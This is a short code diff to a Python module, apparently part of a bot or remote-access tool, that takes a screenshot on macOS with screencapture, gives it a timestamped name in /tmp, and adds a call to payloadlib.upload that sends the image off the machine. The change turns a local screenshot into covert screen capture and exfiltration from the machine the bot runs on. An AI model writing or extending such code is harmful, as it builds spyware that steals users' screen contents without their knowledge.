@@ -5,8 +5,11 @@ DESCRIPTION: Takes screenshot and saves image to bot's /tmp folder
 
 import os
 import sys
+import datetime
 
-if os.system('screencapture /tmp/screen-$(date +"%m_%d_%Y-%T").png') == 0:
-    sys.stdout.write("Screenshot successful")
+filename = '/tmp/image-{}.png'.format(datetime.datetime.now().strftime('%Y-%m-%d-%H-%M'))
+if os.system('screencapture '+filename) == 0:
+    sys.stdout.write("Screenshot successful\n")
+    payloadlib.upload(filename)
 else:
-    sys.stderr.write("Screenshot failed")
+    sys.stderr.write("Screenshot failed\n")
